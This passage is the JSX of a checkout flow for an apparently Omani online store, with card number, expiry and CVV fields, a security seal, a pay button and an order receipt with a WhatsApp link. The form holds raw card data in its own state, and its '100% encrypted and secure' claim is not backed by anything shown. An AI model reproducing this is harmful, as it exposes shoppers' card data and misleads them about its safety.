                    <span>رقم البطاقة البنكية *</span>
                    <div className="relative">
                      <input
                        dir="ltr"
                        inputMode="numeric"
                        value={cardNumber.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim()}
                        onChange={(e) => setCardNumber(e.target.value)}
                        placeholder="0000 0000 0000 0000"
                        required
                      />
                      <CreditCard className="w-5 h-5 absolute left-3 top-3.5 text-slate-400" />
                    </div>
                  </label>

                  <div className="form-row-2">
                    <label>
                      <span>تاريخ الانتهاء *</span>
                      <input
                        dir="ltr"
                        inputMode="numeric"
                        value={cardExpiry}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                          setCardExpiry(val.length > 2 ? `${val.slice(0, 2)}/${val.slice(2)}` : val);
                        }}
                        placeholder="MM/YY"
                        required
                      />
                    </label>

                    <label>
                      <span>رمز CVV *</span>
                      <input
                        dir="ltr"
                        type="password"
                        inputMode="numeric"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                        placeholder="123"
                        required
                      />
                    </label>
                  </div>
                </div>

                {/* Security Seal */}
                <div className="security-seal">
                  <Lock className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>بيانات الدفع مشفرة وآمنة 100% باستخدام أحدث معايير التشفير البنكي</span>
                </div>

                {/* Payment Logos Bar */}
                <div className="payment-logos-bar">
                  <span className="payment-logo-badge">VISA</span>
                  <span className="payment-logo-badge">Mastercard</span>
                  <span className="payment-logo-badge">OmanNet</span>
                </div>

                {checkoutError && (
                  <div className="flex items-center gap-2 p-3 mb-4 text-xs font-semibold text-rose-700 bg-rose-50 border border-rose-200 rounded-lg">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{checkoutError}</span>
                  </div>
                )}

                <div className="flex gap-3 mt-4">
                  <button
                    type="button"
                    className="px-4 py-3 text-xs font-bold text-slate-600 bg-slate-100 rounded-xl hover:bg-slate-200"
                    onClick={() => setCheckoutStep("delivery")}
                    disabled={isProcessing}
                  >
                    تعديل البيانات
                  </button>

                  <button className="checkout-button flex-1" type="submit" disabled={isProcessing}>
                    <span>
                      {isProcessing
                        ? "جارٍ تأكيد الطلب..."
                        : `ادفع ${money(paymentType === "deposit" ? Math.min(1.0, total) : total)}`}
                    </span>
                    <CheckCircle className="w-4 h-4" />
                  </button>
                </div>
              </form>
            )}

            {/* STEP 4: ORDER SUCCESS RECEIPT */}
            {checkoutStep === "success" && completedOrder && (
              <div className="order-success-card">
                <div className="success-icon-badge">
                  <Check className="w-10 h-10" />
                </div>

                <h3>تم تأكيد طلبك بنجاح!</h3>
                <p>تم تسجيل الدفع وأصبح طلبك جاهزاً للتجهيز.</p>

                <div className="receipt-details">
                  <div className="receipt-line">
                    <small>رقم الطلب:</small>
                    <strong dir="ltr">{completedOrder.orderId}</strong>
                  </div>
                  <div className="receipt-line">
                    <small>العميل:</small>
                    <strong>{customerName}</strong>
                  </div>
                  <div className="receipt-line">
                    <small>المحافظة:</small>
                    <strong>{customerGovernorate}</strong>
                  </div>
                  <div className="receipt-line">
                    <small>المبلغ المدفوع:</small>
                    <strong>{completedOrder.amountPaid.toFixed(3)} ر.ع.</strong>
                  </div>
                  <div className="receipt-line">
                    <small>حالة الدفع:</small>
                    <strong className="text-emerald-600">مدفوع ✓</strong>
                  </div>
                </div>

                <div className="flex flex-col w-full gap-3">
                  <a
                    href="https://wa.me/96893649190"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center justify-center gap-2 py-3.5 bg-emerald-600 text-white rounded-xl font-bold text-sm shadow-md hover:bg-emerald-700 transition-all"
                  >
                    <MessageCircle className="w-5 h-5" />
                    <span>متابعة الطلب عبر الواتساب</span>
                  </a>

                  <button
                    type="button"
                    className="py-3 text-xs font-bold text-slate-600 bg-slate-100 rounded-xl hover:bg-slate-200"
                    onClick={closeSheet}
                  >
                    العودة إلى المتجر
                  </button>
                </div>
              </div>
            )}
          </aside>
        </div>
      )}
    </main>
  );
}
